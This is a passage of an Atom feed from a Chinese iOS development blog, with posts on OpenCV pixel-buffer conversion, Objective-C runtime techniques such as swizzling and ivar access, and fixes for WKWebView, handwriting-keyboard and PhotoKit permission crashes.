(int)CVPixelBufferGetWidthOfPlane(pixelBuffer,1);</span><br><span class="line">    int cbcrHeight &#x3D; (int)CVPixelBufferGetHeightOfPlane(pixelBuffer, 1);</span><br><span class="line">    void *cbcrAddress &#x3D; CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 1);</span><br><span class="line">    &#x2F;&#x2F; Since the CbCr Values are alternating we have 2 channels: Cb and Cr. Thus we need to use CV_8UC2 here.</span><br><span class="line">    cv::Mat cbcrPlane &#x3D; cv::Mat(cbcrHeight, cbcrWidth, CV_8UC2, cbcrAddress);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Split them apart so we can merge them with the luma values</span><br><span class="line">    std::vector&lt;cv::Mat&gt; cbcrPlanes;</span><br><span class="line">    cv::split(cbcrPlane, cbcrPlanes);</span><br><span class="line"></span><br><span class="line">    cv::Mat cbPlane;</span><br><span class="line">    cv::Mat crPlane;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Since we have a 4:2:0 format, cb and cr values are only present for each 2x2 luma pixels. Thus we need to enlargen them (by a factor of 2).</span><br><span class="line">    cv::resize(cbcrPlanes[0], cbPlane, yPlane.size(), 0, 0, cv::INTER_NEAREST);</span><br><span class="line">    cv::resize(cbcrPlanes[1], crPlane, yPlane.size(), 0, 0, cv::INTER_NEAREST);</span><br><span class="line"></span><br><span class="line">    cv::Mat ycbcr;</span><br><span class="line">    std::vector&lt;cv::Mat&gt; allPlanes &#x3D; &#123;yPlane, cbPlane, crPlane&#125;;</span><br><span class="line">    cv::merge(allPlanes, ycbcr);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ycbcr now contains all three planes. We need to convert it from YCbCr to BGR so OpenCV can work with it</span><br><span class="line">    cv::cvtColor(ycbcr, converted, cv::COLOR_YCrCb2BGR);</span><br><span class="line"></span><br><span class="line">    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);</span><br><span class="line">    </span><br><span class="line">    return converted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;旋转&quot;&gt;&lt;a href=&quot;#旋转&quot; class=&quot;headerlink&quot; title=&quot;旋转&quot;&gt;&lt;/a&gt;旋转&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span 
      
    
    </summary>
    
    
    
      <category term="Tips" scheme="http://xsenyu.github.io/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>【Crash】 WKWebView 设置 UIScrollViewDelegate</title>
    <link href="http://xsenyu.github.io/2019/05/20/iOS%209%20WKWebView%20%E8%AE%BE%E7%BD%AEUIScrollViewDelegate%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98/"/>
    <id>http://xsenyu.github.io/2019/05/20/iOS%209%20WKWebView%20%E8%AE%BE%E7%BD%AEUIScrollViewDelegate%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98/</id>
    <published>2019-05-20T05:20:00.000Z</published>
    <updated>2020-04-06T08:56:49.294Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>系统要求：iOS 9.x 及之前版本<br>设备要求：无<br>问题详情：使用WKWebView时，设置了scrollView的delegate，但是在关闭页面时没有设回nil，在webView的dealloc时就会崩溃。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_webView.scrollView.delegate &#x3D; self;</span><br></pre></td></tr></table></figure><h3 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h3><p>问题关键堆栈信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [UIScrollView setDelegate:] + 40</span><br><span class="line">- [WKScrollView _updateDelegate] + 228</span><br><span class="line">- [WKWebView dealloc] + 216</span><br></pre></td></tr></table></figure><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>WebKit的bug，因为时iOS 9 及之前版本，初步估计是苹果对于<code>delegate</code>的处理没有达到<code>weak</code>的预期情况，导致在退出当前<code>ViewController</code>的时候更新webView的<code>delegate</code>，还是使用了已经释放的<code>ViewController</code>。<br>在iOS 10苹果已经把问题修复了。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>在页面关闭时，或者页面dealloc时，把scrollView的delegate设回nil。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_webView.scrollView.delegate &#x3D; nil;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h3&gt;&lt;p&gt;系统要求：iOS 9.x 及之前版本&lt;br&gt;设备要求：无&lt;br&gt;问题详情：使用WKWebView时，设置了scrollVie
      
    
    </summary>
    
    
    
      <category term="Crash" scheme="http://xsenyu.github.io/tags/Crash/"/>
    
  </entry>
  
  <entry>
    <title>iOS runtime 常用功能整理</title>
    <link href="http://xsenyu.github.io/2019/05/16/iOS%20runtime%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD%E6%95%B4%E7%90%86/"/>
    <id>http://xsenyu.github.io/2019/05/16/iOS%20runtime%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD%E6%95%B4%E7%90%86/</id>
    <published>2019-05-16T03:37:00.000Z</published>
    <updated>2020-04-06T08:43:54.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改变量值"><a href="#修改变量值" class="headerlink" title="修改变量值"></a>修改变量值</h2><p>用runtime方法修改变量值，相当于赋值语句，主要原理是遍历类的IvarList，找到名字相同的实例变量，然后修改其属性值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取指定名的实例变量</span><br><span class="line">- (Ivar)getIvarWithName: (const char *)ivarName &#123;</span><br><span class="line">    unsigned int count &#x3D; 0;</span><br><span class="line">    &#x2F;&#x2F; 获取实例变量列表</span><br><span class="line">    Ivar *ivarList &#x3D; class_copyIvarList(_person.class, &amp;count);</span><br><span class="line">    &#x2F;&#x2F; 遍历属性名</span><br><span class="line">    for (int i&#x3D;0; i&lt;count; i++) &#123;</span><br><span class="line">        Ivar ivar &#x3D; ivarList[i];</span><br><span class="line">        const char *name &#x3D; ivar_getName(ivar);</span><br><span class="line">        if (strcmp(name, ivarName) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            &#x2F;&#x2F; class_copyIvarList会申请内存，需要手动释放</span><br><span class="line">            free(ivarList);</span><br><span class="line">            return ivar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    free(ivarList);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 修改变量值</span><br><span class="line">Ivar name &#x3D; [self getIvarWithName:&quot;_name&quot;];</span><br><span class="line">if (name !&#x3D; NULL) &#123;</span><br><span class="line">    object_setIvar(_person, name, @&quot;new name&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加属性"><a href="#添加属性" class="headerlink" title="添加属性"></a>添加属性</h2><p>常见于在category里添加属性，自定义getter和setter，因为category不是类，没有指向类的isa指针，也就没有ivar_list，即使添加属性也不会生成setter和getter的实现以及成员变量，所以只能通过关联方式添加属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 添加</span><br><span class="line">const char *key &#x3D; &quot;age&quot;;</span><br><span class="line">objc_setAssociatedObject(_person, key, @&quot;18 years old&quot;, OBJC_ASSOCIATION_RETAIN_NONATOMIC);</span><br><span class="line">&#x2F;&#x2F; 获取属性</span><br><span class="line">objc_getAssociatedObject(_person, key)</span><br></pre></td></tr></table></figure><h2 id="添加方法"><a href="#添加方法" class="headerlink" title="添加方法"></a>添加方法</h2><p>可用通过<code>class_addMethod</code>添加方法，主要是通过selector和imp创建一个method_t添加到类的method_list中。最后一个参数是 type encodings ，用来标识IMP函数实现的返回值与参数，具体可参考官方给出的对应表 <a href="https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjCRuntimeGuide/Articles/ocrtTypeEncodings.html" target="_blank" rel="noopener">type encodings</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">- (void)dynamicallyAddMethod &#123;</span><br><span class="line">    SEL selector &#x3D; @selector(tempMethod);</span><br><span class="line">    IMP imp &#x3D; class_getMethodImplementation(self.class, selector);</span><br><span class="line">    const char *type &#x3D; method_getTypeEncoding(class_getInstanceMethod(self.class, selector));</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 添加方法</span><br><span class="line">    if (![_person respondsToSelector:selector]) &#123;</span><br><span class="line">        class_addMethod(_person.class, selector, imp, type);</span><br><span class="line">    &#125;</span><br><span class="line">    if ([_person respondsToSelector:selector]) &#123;</span><br><span class="line">        &#x2F;&#x2F; 调用方法</span><br><span class="line">        IMP personImp &#x3D; [_person methodForSelector:selector];</span><br><span class="line">        NSString *(*func)(id, SEL) &#x3D; (void *)personImp;</span><br><span class="line">        NSLog(@&quot;%@&quot;, func(_person, selector));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        NSLog(@&quot;Fail to add method dynamically&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="交换方法"><a href="#交换方法" class="headerlink" title="交换方法"></a>交换方法</h2><p>可以交换对象中的两个方法，还可以交换不同对象的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- (void)exchangeMethod &#123;</span><br><span class="line">    NSLog(@&quot;Before exchanging method1 result: &quot;);</span><br><span class="line">    [_person method1];</span><br><span class="line">    Method imp1 &#x3D; class_getInstanceMethod(_person.class, @selector(method1));</span><br><span class="line">    Method imp2 &#x3D; class_getInstanceMethod(self.class, @selector(methodForExchange));</span><br><span class="line">    method_exchangeImplementations(imp1, imp2);</span><br><span class="line">    NSLog(@&quot;After exchanging method1 result: &quot;);</span><br><span class="line">    [_person method1];</span><br><span class="line">    &#x2F;&#x2F; 换回去</span><br><span class="line">    method_exchangeImplementations(imp1, imp2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拓展功能"><a href="#拓展功能" class="headerlink" title="拓展功能"></a>拓展功能</h2><p>主要原理还是上面的交换方法，不过拓展功能应不影响原本方法，因此在新方法中，需要调用原本方法。此功能比较常见，比如想要记录ViewController生命周期，可以另外写一个ViewController的分类，然后在<code>load</code>方法里拓展对应方法，添加自定义记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+ (void)load &#123;</span><br><span class="line">    static dispatch_once_t onceToken;</span><br><span class="line">    dispatch_once(&amp;onceToken, ^&#123;</span><br><span class="line">        Method originMethod &#x3D; class_getInstanceMethod(self.class, @selector(viewDidLoad));</span><br><span class="line">        Method extendMethod &#x3D; class_getInstanceMethod(self.class, @selector(extendMethodForViewDidLoad));</span><br><span class="line">        method_exchangeImplementations(originMethod, extendMethod);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">- (void)extendMethodForViewDidLoad &#123;</span><br><span class="line">    &#x2F;&#x2F; 进行自定义操作</span><br><span class="line">    NSLog(@&quot;Intercept viewDidLoad method and do something... &gt;_&gt;&quot;);</span><br><span class="line">    &#x2F;&#x2F; 调用原来的viewDidLoad</span><br><span class="line">    [self extendMethodForViewDidLoad];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归档解档"><a href="#归档解档" class="headerlink" title="归档解档"></a>归档解档</h2><p>当我们使用 NSCoding 进行归档及解档时，我们需要对所有属性实现一遍 encodeObject 和 decodeObjectForKey 方法，如果模型里面有 10000 个属性, 那么我们就需要写 10000 次，这个时候可以用 runtime 简化操作 。（注意：自定义类型要自行转换）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">- (void)encodeWithCoder:(NSCoder *)aCoder &#123;</span><br><span class="line">    unsigned int count &#x3D; 0;</span><br><span class="line">    Ivar *ivarList &#x3D; class_copyIvarList(self.class, &amp;count);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; count; i ++) &#123;</span><br><span class="line">        Ivar ivar &#x3D; ivarList[i];</span><br><span class="line">        &#x2F;&#x2F; 获取属性名</span><br><span class="line">        NSString *key &#x3D; [NSString stringWithUTF8String:ivar_getName(ivar)];</span><br><span class="line">        &#x2F;&#x2F; 根据属性名称获取对应的值</span><br><span class="line">        id value &#x3D; object_getIvar(self, ivar);</span><br><span class="line">        [aCoder encodeObject:value forKey:key];</span><br><span class="line">    &#125;</span><br><span class="line">    free(ivarList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (instancetype)initWithCoder:(NSCoder *)aDecoder &#123;</span><br><span class="line">    if (self &#x3D; [super init]) &#123;</span><br><span class="line">        unsigned int count &#x3D; 0;</span><br><span class="line">        Ivar *ivarList &#x3D; class_copyIvarList(self.class, &amp;count);</span><br><span class="line">        for (int i &#x3D; 0; i &lt; count; i ++) &#123;</span><br><span class="line">            Ivar ivar &#x3D; ivarList[i];</span><br><span class="line">            NSString *key &#x3D; [NSString stringWithUTF8String:ivar_getName(ivar)];</span><br><span class="line">            &#x2F;&#x2F; 解档取值</span><br><span class="line">            id value &#x3D; [aDecoder decodeObjectForKey:key];</span><br><span class="line">            &#x2F;&#x2F; 赋值</span><br><span class="line">            object_setIvar(self, ivar, value);</span><br><span class="line">        &#125;</span><br><span class="line">        free(ivarList);</span><br><span class="line">    &#125;</span><br><span class="line">    return self;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模型转字典"><a href="#模型转字典" class="headerlink" title="模型转字典"></a>模型转字典</h2><p>目前常用模型转字典第三方库，比如MJExtension、YYModel，其实现方式主要也是通过runtime的方法获取和遍历属性，然后对名称、类型、值进行转换操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">- (void)modelToDict &#123;</span><br><span class="line">    unsigned int count &#x3D; 0;</span><br><span class="line">    NSMutableDictionary *dictionary &#x3D; [NSMutableDictionary dictionary];</span><br><span class="line">    &#x2F;&#x2F; 获取成员属性数组</span><br><span class="line">    Ivar *ivarList &#x3D; class_copyIvarList(_person.class, &amp;count);</span><br><span class="line">    &#x2F;&#x2F; 遍历所有的成员属性名</span><br><span class="line">    for (int i &#x3D; 0; i &lt; count; i ++) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取成员属性</span><br><span class="line">        Ivar ivar &#x3D; ivarList[i];</span><br><span class="line">        NSString *key &#x3D; [[NSString stringWithUTF8String:ivar_getName(ivar)] substringFromIndex:1];</span><br><span class="line">        id value &#x3D; object_getIvar(_person, ivar);</span><br><span class="line">        dictionary[key] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line">    free(ivarList);</span><br><span class="line">    NSLog(@&quot;Model to dictionary: %@&quot;, dictionary);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;修改变量值&quot;&gt;&lt;a href=&quot;#修改变量值&quot; class=&quot;headerlink&quot; title=&quot;修改变量值&quot;&gt;&lt;/a&gt;修改变量值&lt;/h2&gt;&lt;p&gt;用runtime方法修改变量值，相当于赋值语句，主要原理是遍历类的IvarList，找到名字相同的实例变量，然后修改
      
    
    </summary>
    
    
    
      <category term="Tips" scheme="http://xsenyu.github.io/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>【Crash】手写输入崩溃 -[UIKBBlurredKeyView candidateList]</title>
    <link href="http://xsenyu.github.io/2019/05/08/iOS%2011%20%E6%89%8B%E5%86%99%E8%BE%93%E5%85%A5%E5%B4%A9%E6%BA%83%20-[UIKBBlurredKeyView%20candidateList]/"/>
    <id>http://xsenyu.github.io/2019/05/08/iOS%2011%20%E6%89%8B%E5%86%99%E8%BE%93%E5%85%A5%E5%B4%A9%E6%BA%83%20-[UIKBBlurredKeyView%20candidateList]/</id>
    <published>2019-05-08T01:53:00.000Z</published>
    <updated>2020-04-06T08:57:08.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>系统要求：iOS 11.2及之前版本<br>设备要求：无<br>问题详情：因为需要适配小屏幕设备，多个输入框的时候可能需要放在UIScorllView中。当点击其他空白处时候需要隐藏键盘。方法有很多，其中一种做法就是写一个UIScrollView的分类，把Touch事件向后传递，在UITextField所在的界面中重写Touch事件方法关闭键盘。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@implementation UIScrollView (Touch)</span><br><span class="line"></span><br><span class="line">- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event &#123;</span><br><span class="line">    [[self nextResponder] touchesBegan:touches withEvent:event];</span><br><span class="line">    [super touchesBegan:touches withEvent:event];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>然后用手写输入法写了一个字后，候选词的位置变灰色，一点就崩溃。</p><h3 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h3><p><img src="https://upload-images.jianshu.io/upload_images/4881420-be6dbbc6013d4fda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="crash log1"></p><p><img src="https://upload-images.jianshu.io/upload_images/4881420-beb1736269bb8867.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="crash log2"></p><p>问题关键信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-[UIKBBlurredKeyView candidateList]: unrecognized selector sent to instance</span><br></pre></td></tr></table></figure><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>点击手写板的候选词区域(<code>UIKBCandidateCollectionView</code>)时，同样执行了上面的代码，然后事件响应向上传递，但这个view的<code>nextResponder</code>是<code>UIKBHandwritingCandidateView</code>类的实例。执行它的<code>touchesBegan:withEvent:</code>方法后，会使得整个候选词区域呈选中状态，本应调用<code>UIKBCandidateView</code>实例的方法<code>candidateList</code>，结果调用了<code>UIKBBlurredKeyView</code>的<code>candidateList方法</code>，导致方法找不到，导致<code>-[UIKBBlurredKeyView candidateList]: unrecognized selector sent to instance</code>的崩溃。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li>方案一：<br>在<code>touchesBegan</code>方法里对不同的类进行类型判断，只对UIScrollView做响应:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event &#123;</span><br><span class="line">    if ([self isMemberOfClass:[UIScrollView class]]) &#123;</span><br><span class="line">        [[self nextResponder] touchesBegan:touches withEvent:event];</span><br><span class="line">    &#125;</span><br><span class="line">    [super touchesBegan:touches withEvent:event];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>方案二：<br>使用<code>UITapGestureRecognizer</code>类，进行用户的点击事件拦截，且要将tap的<code>cancelsTouchesInView</code>属性设置为<code>NO</code>，否则会屏蔽到当前view的点击事件。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h3&gt;&lt;p&gt;系统要求：iOS 11.2及之前版本&lt;br&gt;设备要求：无&lt;br&gt;问题详情：因为需要适配小屏幕设备，多个输入框的时候可能需要放
      
    
    </summary>
    
    
    
      <category term="Crash" scheme="http://xsenyu.github.io/tags/Crash/"/>
    
  </entry>
  
  <entry>
    <title>【Crash】 PhotoKit--This application is not allowd to access Photo data</title>
    <link href="http://xsenyu.github.io/2019/05/07/PhotoKit%20crash%20--%20This%20application%20is%20not%20allowed%20to%20access%20Photo%20data/"/>
    <id>http://xsenyu.github.io/2019/05/07/PhotoKit%20crash%20--%20This%20application%20is%20not%20allowed%20to%20access%20Photo%20data/</id>
    <published>2019-05-07T09:02:00.000Z</published>
    <updated>2020-04-06T08:58:44.764Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>系统要求：无<br>设备要求：无<br>问题详情：用户禁止应用访问相册，但应用仍然调用了<code>-[PHImageManager defaultManager]</code>方法，当应用出现内存警告时，就会崩溃。</p><h3 id="崩溃信息"><a href="#崩溃信息" class="headerlink" title="崩溃信息"></a>崩溃信息</h3><p>这个问题的崩溃日志：<br><img src="https://upload-images.jianshu.io/upload_images/4881420-6cfa050d9f795f13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="crash log"><br>问题关键信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This application is not allowed to access Photo data.</span><br></pre></td></tr></table></figure><h3 id="复现方法"><a href="#复现方法" class="headerlink" title="复现方法"></a>复现方法</h3><p>1.创建一个新工程，添加相册读取权限<code>Privacy - Photo Library Usage Description</code>。<br>2.在<code>ViewDidLoad</code>的时候调用 <code>-[PHImageManager defaultManager]</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- (void)viewDidLoad &#123;</span><br><span class="line">    [super viewDidLoad];</span><br><span class="line">    &#x2F;&#x2F; Do any additional setup after loading the view.</span><br><span class="line">    </span><br><span class="line">    [PHImageManager defaultManager];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>运行工程，在申请相册访问权限时点 <strong>Don’t Allow</strong>。</li><li>模拟内存警告，工具栏点 <code>Debug</code> -&gt; <code>Simulate Memory Warning</code>，就会崩溃。<br><img src="https://upload-images.jianshu.io/upload_images/4881420-d224958b24d810a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Memory warning"></li></ol><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p><code>PHImageManager</code>在初始化的时候添加<code>DISPATCH_SOURCE_TYPE_MEMORYPRESSURE</code>事件通知，当内存不够的时候会尝试移除缓存。PHImageManager 是一个懒加载的对象，你如果曾经调用过 <code>-[PHImageManager defaultManager]</code> 隐式初始化，而且没获得相册权限，就会导致 crash。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>读取相册前先判断相册权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PHAuthorizationStatus status &#x3D; [PHPhotoLibrary authorizationStatus];</span><br><span class="line">switch (status) &#123;</span><br><span class="line">    case PHAuthorizationStatusAuthorized:</span><br><span class="line">        &#x2F;&#x2F; 可以读取相册</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case PHAuthorizationStatusNotDetermined:</span><br><span class="line">        &#x2F;&#x2F; 执行获取权限操作</span><br><span class="line">        [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) &#123;</span><br><span class="line">            if (status &#x3D;&#x3D; PHAuthorizationStatusAuthorized) &#123;</span><br><span class="line">                &#x2F;&#x2F; 可以读取相册</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                &#x2F;&#x2F; 提示在设置中打开相册访问权限</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;];</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case PHAuthorizationStatusDenied:</span><br><span class="line">        &#x2F;&#x2F; 提示在设置中打开相册访问权限</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case PHAuthorizationStatusRestricted:</span><br><span class="line">        &#x2F;&#x2F; 提示访问相册受到限制，比如家长控制</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    default:</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确保拥有相册权限才读取相册图片，尤其是调用<code>-[PHImageManager defaultManager]</code>。</p><p>另外打开设置中当前应用设置的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString] options:@&#123;&#125; completionHandler:nil];</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h3&gt;&lt;p&gt;系统要求：无&lt;br&gt;设备要求：无&lt;br&gt;问题详情：用户禁止应用访问相册，但应用仍然调用了&lt;code&gt;-[PHImageMan
      
    
    </summary>
    
    
    
      <category term="Crash" scheme="http://xsenyu.github.io/tags/Crash/"/>
    
  </entry>
  
  <entry>
    <title>Swift 与 OC 混编</title>
    <link href="http://xsenyu.github.io/2019/04/28/Swift%E4%B8%8EOC%E6%B7%B7%E7%BC%96/"/>
    <id>http://xsenyu.github.io/2019/04/28/Swift%E4%B8%8EOC%E6%B7%B7%E7%BC%96/</id>
    <published>2019-04-28T09:54:00.000Z</published>
    <updated>2020-04-06T08:45:48.947Z</updated>
    
